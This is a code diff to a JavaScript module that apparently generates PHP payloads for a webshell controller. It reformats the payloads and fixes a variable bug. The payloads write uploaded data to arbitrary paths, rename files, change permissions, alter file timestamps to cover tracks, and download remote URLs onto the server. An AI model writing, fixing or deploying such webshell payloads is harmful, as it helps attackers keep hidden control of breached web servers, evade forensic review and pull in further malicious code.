@@ -36,25 +36,45 @@ module.exports = (arg1, arg2, arg3) => ({
   },
 
   upload_file: {
-    _: `$f=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));$c=$_POST["${arg2}"];$c=str_replace("\r","",$c);$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");`,
+    _: `$f=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));
+    $c=$_POST["${arg2}"];
+    $c=str_replace("\\r","",$c);
+    $c=str_replace("\\n","",$c);
+    $buf="";
+    for($i=0;$i<strlen($c);$i+=2)
+      $buf.=urldecode("%".substr($c,$i,2));
+    echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");`.replace(/\n\s+/g, ''),
     [arg1]: "#{newbase64::path}",
     [arg2]: "#{buffer::content}"
   },
 
   rename: {
-    _: `$m=get_magic_quotes_gpc();$src=base64_decode(substr(m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));$dst=base64_decode(substr(m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));echo(rename($src,$dst)?"1":"0");`,
+    _: `$m=get_magic_quotes_gpc();
+    $src=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+    $dst=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
+    echo(rename($src,$dst)?"1":"0");`.replace(/\n\s+/g, ''),
     [arg1]: "#{newbase64::path}",
     [arg2]: "#{newbase64::name}"
   },
 
   retime: {
-    _: `$m=get_magic_quotes_gpc();$FN=base64_decode(substr(m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));$TM=strtotime(base64_decode(substr(m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"]),#randomPrefix#));if(file_exists($FN)){echo(@touch($FN,$TM,$TM)?"1":"0");}else{echo("0");};`,
+    _: `$m=get_magic_quotes_gpc();
+    $FN=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+    $TM=strtotime(base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"], #randomPrefix#)));
+    if(file_exists($FN)){
+      echo(@touch($FN,$TM,$TM)?"1":"0");
+    }else{
+      echo("0");
+    };`.replace(/\n\s+/g, ''),
     [arg1]: "#{newbase64::path}",
     [arg2]: "#{newbase64::time}"
   },
 
   chmod: {
-    _: `$m=get_magic_quotes_gpc();$FN=base64_decode(substr(m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));$mode=base64_decode(substr(m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));echo(chmod($FN,octdec($mode))?"1":"0");`,
+    _: `$m=get_magic_quotes_gpc();
+    $FN=base64_decode(substr($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"],#randomPrefix#));
+    $mode=base64_decode(substr($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"],#randomPrefix#));
+    echo(chmod($FN,octdec($mode))?"1":"0");`.replace(/\n\s+/g, ''),
     [arg1]: "#{newbase64::path}",
     [arg2]: "#{newbase64::mode}"
   },
@@ -65,7 +85,19 @@ module.exports = (arg1, arg2, arg3) => ({
   },
 
   wget: {
-    _: `$fR=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));$fL=base64_decode(substr($_POST["${arg2}"],#randomPrefix#));$F=@fopen($fR,chr(114));$L=@fopen($fL,chr(119));if($F && $L){while(!feof($F))@fwrite($L,@fgetc($F));@fclose($F);@fclose($L);echo("1");}else{echo("0");};`,
+    _: `$fR=base64_decode(substr($_POST["${arg1}"],#randomPrefix#));
+    $fL=base64_decode(substr($_POST["${arg2}"],#randomPrefix#));
+    $F=@fopen($fR,chr(114));
+    $L=@fopen($fL,chr(119));
+    if($F && $L){
+      while(!feof($F))
+        @fwrite($L,@fgetc($F));
+      @fclose($F);
+      @fclose($L);
+      echo("1");
+    }else{
+      echo("0");
+    };`.replace(/\n\s+/g, ''),
     [arg1]: "#{newbase64::url}",
     [arg2]: "#{newbase64::path}"
   }
